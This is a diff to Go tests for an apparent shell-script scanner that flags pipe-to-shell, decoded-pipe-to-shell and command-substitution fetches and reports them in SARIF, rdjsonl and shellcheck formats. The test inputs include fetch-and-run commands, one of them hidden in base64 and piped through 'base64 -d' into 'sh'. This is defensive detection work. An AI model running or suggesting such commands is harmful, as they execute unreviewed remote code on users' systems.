@@ -81,6 +81,23 @@ func TestAnalyzeInputFileDetectsMultilineCommandSubstitution(t *testing.T) {
 	}
 }
 
+func TestAnalyzeInputFileDetectsSplitDecodedPipeAcrossWideWindow(t *testing.T) {
+	input := "echo Y3VybCBodHRwczovL2V4YW1wbGUuY29tL2luc3RhbGwuc2ggfCBzaA== |\n  base64\n  -d\n  |\n  sh\n"
+	findings, lines := analyzeInput(input, nil, "payload.sh", "none")
+	found := false
+	for i, f := range findings {
+		if f.Kind == sentinel.KindDecodedPipeToShell {
+			found = true
+			if lines[i] < 1 || lines[i] > 2 {
+				t.Fatalf("expected split decoded finding to map to early line, got %d", lines[i])
+			}
+		}
+	}
+	if !found {
+		t.Fatalf("expected decoded-pipe-to-shell finding, got %#v", findings)
+	}
+}
+
 func TestAnalyzeInputFileDetectsHeredocShellExec(t *testing.T) {
 	input := "bash <<'EOF'\ncurl -fsSL https://example.com/install.sh | sh\nEOF\n"
 	findings, lines := analyzeInput(input, nil, "payload.sh", "none")
@@ -320,8 +337,11 @@ func TestShouldFailInvalidThreshold(t *testing.T) {
 }
 
 func TestOutputModeCount(t *testing.T) {
-	if got := outputModeCount(true, false, true); got != 2 {
+	if got := outputModeCount(true, false, true, false); got != 2 {
 		t.Fatalf("expected 2, got %d", got)
+	}
+	if got := outputModeCount(false, false, false, true); got != 1 {
+		t.Fatalf("expected 1, got %d", got)
 	}
 }
 
@@ -364,7 +384,7 @@ func TestEncodeReportJSONFindingsPresent(t *testing.T) {
 
 func TestEncodeSARIF(t *testing.T) {
 	var out bytes.Buffer
-	err := encodeSARIF(&out, "bash -c \"$(curl -fsSL https://example.com/install.sh)\"", []sentinel.Finding{{Kind: "fetch-in-command-substitution", Severity: sentinel.SeverityHigh, Message: "x"}})
+	err := encodeSARIF(&out, "bash -c \"$(curl -fsSL https://example.com/install.sh)\"", []sentinel.Finding{{Kind: sentinel.KindFetchInCommandSubstitution, Severity: sentinel.SeverityHigh, Message: "x"}})
 	if err != nil {
 		t.Fatalf("encode sarif: %v", err)
 	}
@@ -381,7 +401,7 @@ func TestEncodeSARIF(t *testing.T) {
 
 func TestEncodeRDJSONL(t *testing.T) {
 	var out bytes.Buffer
-	err := encodeRDJSONL(&out, []sentinel.Finding{{Kind: "pipe-to-shell", Severity: sentinel.SeverityHigh, Message: "x"}}, []int{5}, "script.sh", 1)
+	err := encodeRDJSONL(&out, []sentinel.Finding{{Kind: sentinel.KindPipeToShell, Severity: sentinel.SeverityHigh, Message: "x"}}, []int{5}, "script.sh", 1)
 	if err != nil {
 		t.Fatalf("encode rdjsonl: %v", err)
 	}
@@ -395,6 +415,18 @@ func TestEncodeRDJSONL(t *testing.T) {
 	}
 	if decoded["severity"] != "ERROR" {
 		t.Fatalf("unexpected severity: %v", decoded["severity"])
+	}
+}
+
+func TestEncodeShellcheck(t *testing.T) {
+	var out bytes.Buffer
+	err := encodeShellcheck(&out, []sentinel.Finding{{Kind: sentinel.KindPipeToShell, Severity: sentinel.SeverityHigh, Message: "x"}}, []int{7}, "script.sh", 1)
+	if err != nil {
+		t.Fatalf("encode shellcheck: %v", err)
+	}
+	got := strings.TrimSpace(out.String())
+	if got != "script.sh:7:1: error: x [pipe-to-shell]" {
+		t.Fatalf("unexpected shellcheck output: %q", got)
 	}
 }
 
